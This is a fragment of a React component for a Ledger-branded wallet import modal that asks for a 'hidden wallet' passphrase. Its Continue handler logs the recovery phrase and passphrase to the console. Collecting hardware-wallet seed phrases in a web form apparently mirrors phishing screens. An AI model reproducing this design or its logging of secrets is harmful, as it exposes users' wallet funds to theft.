              <button onClick={onClose} className="p-2 rounded-[10px] hover:bg-[#f3f3f3] dark:hover:bg-[#eaeaea0d] transition-all active:scale-95">
                <svg className="w-6 h-6 text-[#202020] dark:text-white" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg>
              </button>
            </div>

            <div className="flex-1 flex flex-col">
              <div className="w-full max-w-lg mx-auto mt-4">
                <div className="mb-8">
                  <p className="text-[#202020] dark:text-white text-[15px] sm:text-[16px] leading-relaxed">
                    Enter your passphrase to access your hidden wallet, or leave it empty to continue with your standard wallet.
                  </p>
                </div>
                <div className="mb-6">
                  <label className="block text-[#202020] dark:text-white text-[14px] font-medium mb-2">
                    Passphrase
                  </label>
                  <input 
                    className="w-full h-[48px] py-[11px] px-[16px] text-[14px] font-medium rounded-[10px] text-[#222222] dark:text-white border border-[#ebebeb] dark:border-[#47484A] hover:border-[#9d9d9d] dark:hover:border-[#c6c6c6] bg-transparent dark:bg-[#0C0D0F] focus:bg-[#fbfbfb] dark:focus:bg-[#0f0f0f] focus:border-[#6491F1] dark:focus:border-[#BCB1FF] outline-none transition-all duration-300" 
                    type="password" 
                    placeholder="Enter passphrase (optional)"
                    value={passphrase}
                    onChange={(e) => setPassphrase(e.target.value)}
                  />
                </div>
              </div>
            </div>

            <div className="pt-4 border-t border-[#EDEDED] dark:border-[#27282A] mt-auto">
              <button 
                onClick={() => {
                  console.log("Ledger Import Complete:", { phrase: phraseValues.slice(0, phraseLength), passphrase });
                  onClose();
                }}
                className="w-full text-white bg-[#6491F1] dark:text-[#1a1a1a] dark:bg-[#BCB1FF] font-semibold text-[16px] rounded-[12px] h-[52px] hover:opacity-90 transition-all hover:shadow-[#6491F1]/30 dark:hover:shadow-[#BCB1FF]/30 active:scale-[0.98]"
              >
                Continue
              </button>
            </div>
          </div>

        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .ledger-logo-wrapper {
          position: relative;
          width: 160px;
          height: 35px;
          overflow: visible;
        }
        .ledger-left-part {
          transform-origin: center;
        }
        .ledger-middle-part {
          clip-path: inset(0 100% 0 0);
          transition: clip-path 0.8s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .ledger-right-part {
          transform: translateX(-237px);
          transform-origin: center;
          transition: transform 0.8s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .ledger-logo-animating .ledger-middle-part {
          clip-path: inset(0 0 0 0);
        }
        .ledger-logo-animating .ledger-right-part {
          transform: translateX(0);
        }
        
        .ledger-custom-scrollbar {
          scrollbar-width: thin;
          scrollbar-color: #d1d1d1 transparent;
        }
        .ledger-custom-scrollbar::-webkit-scrollbar {
          width: 6px;
        }
        .ledger-custom-scrollbar::-webkit-scrollbar-track {
          background: transparent;
        }
        .ledger-custom-scrollbar::-webkit-scrollbar-thumb {
          background: #d1d1d1;
          border-radius: 10px;
        }
        .ledger-custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: #b8b8b8;
        }
        .dark .ledger-custom-scrollbar {
          scrollbar-color: #3a3a3a transparent;
        }
        .dark .ledger-custom-scrollbar::-webkit-scrollbar-thumb {
          background: #3a3a3a;
        }
        .dark .ledger-custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: #4a4a4a;
        }
      `}} />
    </div>
  );
}